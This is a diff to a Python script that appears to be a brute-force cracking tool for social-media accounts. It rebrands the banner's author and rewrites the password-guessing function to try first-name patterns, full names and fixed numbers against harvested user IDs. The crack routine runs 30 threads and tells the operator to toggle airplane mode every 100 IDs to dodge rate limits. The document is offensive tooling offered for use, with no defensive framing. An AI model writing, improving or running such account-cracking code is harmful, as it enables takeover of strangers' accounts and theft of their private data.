@@ -298,7 +298,7 @@ def Menu():
  |_____  |    \\_ |     | |_____  |    \\_      __|__ |_____|
                                           
 {CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
-{CYAN}│ {CYAN}Author : {GREEN}RAYANXWEB {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
+{CYAN}│ {CYAN}Author : {GREEN}sumon {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
 {CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
     print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\n{WHITE}Followers : {GREEN}{fol}")
     
@@ -629,6 +629,7 @@ def MetodeType():
     SetCrack()
 
 def SetCrack():
+    os.system("clear")
     print(f"\n{YELLOW}Cracking in progress, please enable airplane mode \nfor every 100 usernames/id for 5 seconds\n{WHITE}")
     
     if len(Uuid) == 0:
@@ -636,7 +637,8 @@ def SetCrack():
         return Menu()
     
     print(f"{GREEN}Starting crack with {len(Uuid)} users...")
-    
+
+
     with ThreadPoolExecutor(max_workers=30) as ASF:
         for i in Uuid:
             try:
@@ -662,53 +664,19 @@ def SetCrack():
 
 def Password(name):
     xxzx = []
-    for nama in name.split(' '):
-        nama = nama.lower()
-        if len(nama) < 3:
-            continue
-        elif len(nama) in [3, 4, 5]:
-            xxzx.append(nama + '123')
-            xxzx.append(nama + '26')
-            xxzx.append(nama + '1234')
-            xxzx.append('wonosobo' + '123')
-            xxzx.append('skorsa99')
-            xxzx.append(nama + '2008')
-            xxzx.append('wonosobo12345')
-            xxzx.append('wonosobo' + '1234')
-            xxzx.append(nama + '28')
-            xxzx.append(nama + '2009')
-            xxzx.append(nama + '456')
-            xxzx.append(nama.capitalize() + '789')
-            xxzx.append('katasandi')
-            xxzx.append(nama.capitalize() + 'cantik')
-            xxzx.append(nama.capitalize() + '1234')
-            xxzx.append(nama.capitalize() + '29')
-            xxzx.append(nama.capitalize() + '12')
-            xxzx.append(nama.capitalize() + '123456')
-            xxzx.append(nama.capitalize() + '123')
-            xxzx.append(nama.capitalize() + '12345')
-        else:
-            xxzx.append(nama)
-            xxzx.append(name)
-            xxzx.append(nama + '1234')
-            xxzx.append(nama + '12345')
-            xxzx.append(nama + '123456789')
-            xxzx.append(nama + '99')
-            xxzx.append(nama + '12')
-            xxzx.append(nama + '123456')
-            xxzx.append(nama.capitalize() + '321')
-            xxzx.append(nama + '34')
-            xxzx.append(nama + '2009')
-            xxzx.append(nama + '28')
-            xxzx.append(nama + '29')
-            xxzx.append('wonosobo12345')
-            xxzx.append('wonosobo' + '1234')
-            xxzx.append(nama + '20')
-            xxzx.append(nama + '2008')
-            xxzx.append(nama + '2010')
-            xxzx.append(nama.capitalize() + '123')
-            xxzx.append(nama.capitalize() + '12345')
+    
+    parts = name.split(' ')
+    firstname = parts[0].lower()
+    
+    # Only these passwords
+    xxzx.append(firstname + '@123')           # firstname@123
+    xxzx.append(name)                         # full name (sumon roy)
+    xxzx.append(firstname + '@1234')          # firstname@1234
+    xxzx.append('57273200')                   # 57273200
+    xxzx.append('59039200')                   # 59039200
+    
     return xxzx
+
 
 def convert_cookie(item):
     try:
